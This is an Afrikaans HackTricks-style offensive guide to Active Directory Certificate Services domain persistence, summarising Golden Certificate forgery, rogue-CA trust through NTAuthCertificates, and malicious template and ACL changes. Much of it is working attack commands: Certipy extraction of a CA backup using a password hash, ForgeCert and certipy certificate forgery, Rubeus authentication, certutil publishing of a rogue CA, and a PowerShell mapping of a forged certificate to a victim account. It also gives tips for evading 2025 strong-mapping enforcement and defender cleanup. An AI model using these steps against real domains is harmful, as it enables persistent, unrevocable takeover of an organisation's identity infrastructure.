# AD CS Domein Persistensie

{{#include ../../../banners/hacktricks-training.md}}

**Dit is 'n opsomming van die domein persistensie tegnieke gedeel in [https://www.specterops.io/assets/resources/Certified_Pre-Owned.pdf](https://www.specterops.io/assets/resources/Certified_Pre-Owned.pdf)**. Raadpleeg dit vir verdere besonderhede.

## Vervalsing van sertifikate met gesteelde CA-sertifikate (Golden Certificate) - DPERSIST1

Hoe kan jy vasstel dat 'n sertifikaat 'n CA-sertifikaat is?

Jy kan bepaal dat 'n sertifikaat 'n CA-sertifikaat is as verskeie voorwaardes nagekom word:

- Die sertifikaat is op die CA-bediener gestoor, met sy private sleutel beveilig deur die masjien se DPAPI, of deur hardeware soos 'n TPM/HSM indien die bedryfstelsel dit ondersteun.
- Beide die Issuer- en Subject-velde van die sertifikaat stem ooreen met die onderskeibare naam van die CA.
- 'n "CA Version" uitbreiding kom uitsluitlik in die CA-sertifikate voor.
- Die sertifikaat het nie Extended Key Usage (EKU)-velde nie.

Om die private sleutel van hierdie sertifikaat te onttrek, is die `certsrv.msc` instrument op die CA-bediener die ondersteunde metode via die ingeboude GUI. Nietemin verskil hierdie sertifikaat nie van ander wat in die stelsel gestoor is nie; dus kan metodes soos die [THEFT2 technique](certificate-theft.md#user-certificate-theft-via-dpapi-theft2) vir ekstraksie toegepas word.

Die sertifikaat en private sleutel kan ook verkry word met Certipy met die volgende opdrag:
```bash
certipy ca 'corp.local/administrator@ca.corp.local' -hashes :123123.. -backup
```
Sodra die CA-sertifikaat en die privaat sleutel in `.pfx` formaat verkry is, kan gereedskap soos [ForgeCert](https://github.com/GhostPack/ForgeCert) gebruik word om geldige sertifikate te genereer:
```bash
# Generating a new certificate with ForgeCert
ForgeCert.exe --CaCertPath ca.pfx --CaCertPassword Password123! --Subject "CN=User" --SubjectAltName localadmin@theshire.local --NewCertPath localadmin.pfx --NewCertPassword Password123!

# Generating a new certificate with certipy
certipy forge -ca-pfx CORP-DC-CA.pfx -upn administrator@corp.local -subject 'CN=Administrator,CN=Users,DC=CORP,DC=LOCAL'

# Authenticating using the new certificate with Rubeus
Rubeus.exe asktgt /user:localdomain /certificate:C:\ForgeCert\localadmin.pfx /password:Password123!

# Authenticating using the new certificate with certipy
certipy auth -pfx administrator_forged.pfx -dc-ip 172.16.126.128
```
> [!WARNING]
> Die gebruiker wat geteiken word vir sertifikaatvervalsing moet aktief wees en in staat wees om in Active Directory te verifieer sodat die proses kan slaag. Om 'n sertifikaat vir spesiale rekeninge soos krbtgt te vervals is ondoeltreffend.

Hierdie vervalste sertifikaat sal **geldig** wees tot die aangeduide einddatum en sowel as **solank die root CA-sertifikaat geldig is** (gewoonlik van 5 tot **10+ jaar**). Dit is ook geldig vir **masjiene**, sodat in kombinasie met **S4U2Self**, 'n aanvaller **persistentie op enige domain machine kan handhaaf** solank die CA-sertifikaat geldig bly.\
Boonop kan die **sertifikate wat gegenereer word** met hierdie metode **nie ingetrek word nie** aangesien die CA nie daarvan bewus is nie.

### Werksaam onder Strong Certificate Mapping Enforcement (2025+)

Sedert 11 Februarie 2025 (na die KB5014754 rollout), stel domain controllers standaard in op **Full Enforcement** vir certificate mappings. In praktyk beteken dit jou vervalste sertifikate moet óf:

- Bevat 'n sterk binding aan die teikenrekening (byvoorbeeld, die SID security extension), of
- Wees gepaard met 'n sterk, eksplisiete mapping op die teikenobjek se `altSecurityIdentities` attribuut.

'n Betroubare benadering vir persistentie is om 'n vervalste sertifikaat te mint wat geketting is aan die gesteelde Enterprise CA en dan 'n sterk eksplisiete mapping by die slagoffer-principal te voeg:
```powershell
# Example: map a forged cert to a target account using Issuer+Serial (strong mapping)
$Issuer  = 'DC=corp,DC=local,CN=CORP-DC-CA'           # reverse DN format expected by AD
$SerialR = '1200000000AC11000000002B'                  # serial in reversed byte order
$Map     = "X509:<I>$Issuer<SR>$SerialR"             # strong mapping format
Set-ADUser -Identity 'victim' -Add @{altSecurityIdentities=$Map}
```
Aantekeninge
- As jy vervalste sertifikate kan vervaardig wat die SID security extension insluit, sal dié selfs onder Full Enforcement implisiet gekoppel word. Andersins, verkies eksplisiete sterk koppelinge. Sien [account-persistence](account-persistence.md) vir meer oor eksplisiete koppelinge.
- Herroeping help verdedigers hier nie: vervalste sertifikate is onbekend aan die CA-databasis en kan dus nie herroep word nie.

## Vertroue in Kwaadwillige CA-sertifikate - DPERSIST2

Die `NTAuthCertificates`-objek is gedefinieer om een of meer **CA-sertifikate** in sy `cacertificate`-attribuut te bevat, wat deur Active Directory (AD) gebruik word. Die verifikasieproses deur die domeinbeheerder behels dat die `NTAuthCertificates`-objek nagegaan word vir 'n inskrywing wat ooreenstem met die CA wat in die Issuer-veld van die autentiserende **sertifikaat** gespesifiseer is. Autentisering gaan voort as 'n ooreenstemming gevind word.

'n Self-signed CA-sertifikaat kan by die `NTAuthCertificates`-objek gevoeg word deur 'n aanvaller, mits hulle beheer oor hierdie AD-objek het. Normaalweg word slegs lede van die **Enterprise Admin** groep, tesame met **Domain Admins** of **Administrators** in die **forest root’s domain**, toestemming gegee om hierdie objek te wysig. Hulle kan die `NTAuthCertificates`-objek wysig met `certutil.exe` met die opdrag `certutil.exe -dspublish -f C:\Temp\CERT.crt NTAuthCA`, of deur die [**PKI Health Tool**](https://docs.microsoft.com/en-us/troubleshoot/windows-server/windows-security/import-third-party-ca-to-enterprise-ntauth-store#method-1---import-a-certificate-by-using-the-pki-health-tool) te gebruik.

Addisionele nuttige opdragte vir hierdie tegniek:
```bash
# Add/remove and inspect the Enterprise NTAuth store
certutil -enterprise -f -AddStore NTAuth C:\Temp\CERT.crt
certutil -enterprise -viewstore NTAuth
certutil -enterprise -delstore NTAuth <Thumbprint>

# (Optional) publish into AD CA containers to improve chain building across the forest
certutil -dspublish -f C:\Temp\CERT.crt RootCA          # CN=Certification Authorities
certutil -dspublish -f C:\Temp\CERT.crt CA               # CN=AIA
```
Hierdie vermoë is veral relevant wanneer dit saam met 'n vroeër uiteengesette metode gebruik word wat ForgeCert insluit om sertifikate dinamies te genereer.

> Post-2025 kaartleggings-oorwegings: om 'n skelms-CA in NTAuth te plaas vestig slegs vertroue in die uitreikende CA. Om leaf certificates vir logon te gebruik wanneer DCs in **Full Enforcement** is, moet die leaf óf die SID-sekuriteitsuitbreiding bevat óf daar moet 'n sterk eksplisiete kaartlegging op die teikenobjek wees (byvoorbeeld Issuer+Serial in `altSecurityIdentities`). Sien {{#ref}}account-persistence.md{{#endref}}.

## Kwaadaardige miskonfigurasie - DPERSIST3

Moontlikhede vir **persistence** deur **security descriptor-wysigings van AD CS** komponente is volop. Wysigings beskryf in die "[Domain Escalation](domain-escalation.md)" afdeling kan kwaadwillig deur 'n aanvaller met verhoogde toegang geïmplementeer word. Dit sluit die toevoeging van "control rights" (bv. WriteOwner/WriteDACL/etc.) by sensitiewe komponente in soos:

- Die **CA server’s AD computer** object
- Die **CA server’s RPC/DCOM server**
- Enige **descendant AD object or container** in **`CN=Public Key Services,CN=Services,CN=Configuration,DC=<DOMAIN>,DC=<COM>`** (byvoorbeeld die Certificate Templates container, Certification Authorities container, die NTAuthCertificates object, ens.)
- **AD groups** wat regte gedelegeer het om AD CS te beheer, standaard of deur die organisasie (soos die ingeboude Cert Publishers group en enige van sy lede)

'n Voorbeeld van kwaadwillige implementering sou behels dat 'n aanvaller met **elevated permissions** in die domein die **`WriteOwner`** permissie by die standaard **`User`** sertifikaatsjabloon voeg, met die aanvaller as die prinsipaal vir die reg. Om dit uit te buit, sou die aanvaller eers die eienaarskap van die **`User`** sjabloon na homself verander. Daarna sal die **`mspki-certificate-name-flag`** op die sjabloon op **1** gestel word om **`ENROLLEE_SUPPLIES_SUBJECT`** te aktiveer, wat 'n gebruiker toelaat om 'n Subject Alternative Name in die versoek te verskaf. Vervolgens kan die aanvaller homself **enroll** deur die **template** te gebruik, 'n **domain administrator** naam as alternatiewe naam kies, en die verkrygde sertifikaat vir verifikasie as die DA gebruik.

Praktiese instellings wat aanvallers kan stel vir langdurige domein-persistence (sien {{#ref}}domain-escalation.md{{#endref}} vir volledige besonderhede en opsporing):

- CA beleidsvlae wat SAN van versoekers toelaat (bv. om `EDITF_ATTRIBUTESUBJECTALTNAME2` te aktiveer). Dit hou ESC1-agtige paaie uitbuitbaar.
- Sjabloon DACL of instellings wat uitreiking moontlik maak wat vir verifikasie geskik is (bv. toevoeg van Client Authentication EKU, aktivering van `CT_FLAG_ENROLLEE_SUPPLIES_SUBJECT`).
- Beheer oor die `NTAuthCertificates` object of die CA-konteiners om skelms-uitreikers voortdurend weer in te voer as verdedigers skoonmaak probeer.

> [!TIP]
> In geharde omgewings na KB5014754, die koppeling van hierdie miskonfigurasies met eksplisiete sterk kaartleggings (`altSecurityIdentities`) verseker dat jou uitgereikte of vervalste sertifikate bruikbaar bly selfs wanneer DCs sterk kaartlegging afdwing.

## Verwysings

- Microsoft KB5014754 – Certificate-based authentication changes on Windows domain controllers (enforcement timeline and strong mappings). https://support.microsoft.com/en-au/topic/kb5014754-certificate-based-authentication-changes-on-windows-domain-controllers-ad2c23b0-15d8-4340-a468-4d4f3b188f16
- Certipy – Opdragverwysing en forge/auth gebruik. https://github.com/ly4k/Certipy/wiki/08-%E2%80%90-Command-Reference
- [0xdf – HTB: Certificate (SeManageVolumePrivilege to exfil CA keys → Golden Certificate)](https://0xdf.gitlab.io/2025/10/04/htb-certificate.html)

{{#include ../../../banners/hacktricks-training.md}}
